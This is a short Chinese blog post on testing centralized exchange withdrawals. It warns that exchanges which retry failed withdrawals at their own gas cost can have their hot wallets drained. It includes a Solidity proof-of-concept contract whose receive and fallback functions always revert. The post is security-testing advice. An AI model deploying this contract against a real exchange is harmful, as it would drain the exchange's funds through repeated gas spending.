---
title: "中心化交易所提现测试-Gas消耗测试"
date: 2023-06-29T0:18:30-04:00
categories:
  - experience
tags:
  - experience
---

## 中心化交易所提现测试-Gas消耗测试

在测试提现功能的时候，需要留意下如果提现失败的场景，用户是否需要继续重新支付Gas Fee，如果需要重新支付Gas Fee的情况，那就没问题；如果是无需用户重新支付Gas Fee的情况就需要注意了，之前在挖掘漏洞的过程中就遇到过类似的情况，提现的时候只收了一次Gas Fee，提现的交易被合约回退了以后，交易所还会继续尝试提现（此时Gas Fee由交易所自己出），这种设计可能会导致热钱包资金被耗尽。

Poc:
```
pragma solidity ^0.8.0;


contract Burn{
    address private owner ;
    constructor() payable{
        owner = msg.sender;
    }


    function transferEth(address payable _addr,uint256 _value) external payable{
        require(owner == msg.sender,"!owner!");
        _addr.transfer(_value);
    }


    fallback() payable external{
        revert();
    }
    receive() payable external {
        revert();                          
    }
}

```
